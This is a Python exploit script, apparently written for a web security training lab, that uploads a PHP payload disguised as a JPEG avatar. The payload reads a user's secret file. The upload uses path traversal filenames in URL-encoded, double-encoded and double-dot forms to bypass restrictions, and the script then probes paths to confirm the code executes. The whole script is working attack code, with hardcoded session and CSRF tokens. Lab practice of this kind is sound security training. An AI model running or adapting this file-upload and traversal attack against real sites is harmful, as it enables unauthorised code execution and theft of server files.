#!/usr/bin/env python3
import requests

host = "0a200096044941a1841082800039003d.web-security-academy.net"
url = f"https://{host}/my-account/avatar"
session = "zaWArpVTEAPSF3P6dcrNojZWhrhGo6Uw"
csrf = "y1pdKmu7jq9F2k0Pi9mxG0rlhZ0VtODY"

php_payload = '<?php echo file_get_contents("/home/carlos/secret"); ?>'

headers = {
    "Cookie": f"session={session}",
    "Origin": f"https://{host}",
    "Referer": f"https://{host}/my-account?id=wiener"
}

# Test just the most likely bypasses
test_cases = [
    ("..%2f..%2f..%2fexploit.php", "URL encoded"),
    ("..%252f..%252f..%252fexploit.php", "Double URL encoded"),
    ("....//....//....//exploit.php", "Double dots"),
]

print("Testing key path traversal bypasses...")

for filename, desc in test_cases:
    print(f"\nTrying: {desc} - {filename}")

    files = {
        'avatar': (filename, php_payload, 'image/jpeg'),
        'user': (None, 'wiener'),
        'csrf': (None, csrf)
    }

    try:
        resp = requests.post(url, headers=headers, files=files, verify=False, timeout=5)
        print(f"Upload status: {resp.status_code}")

        # Check where it ended up
        test_paths = [
            f"/files/avatars/{filename}",
            "/exploit.php",
            f"/files/avatars/exploit.php"
        ]

        for path in test_paths:
            test_url = f"https://{host}{path}"
            r = requests.get(test_url, headers={"Cookie": f"session={session}"}, verify=False, timeout=2)
            if r.status_code == 200:
                if not r.text.startswith("<?php"):
                    print(f"✅ SUCCESS at {path}: {r.text}")
                    exit(0)
                else:
                    print(f"Found at {path} but not executed")

    except Exception as e:
        print(f"Error: {e}")

print("\nNo successful bypass found")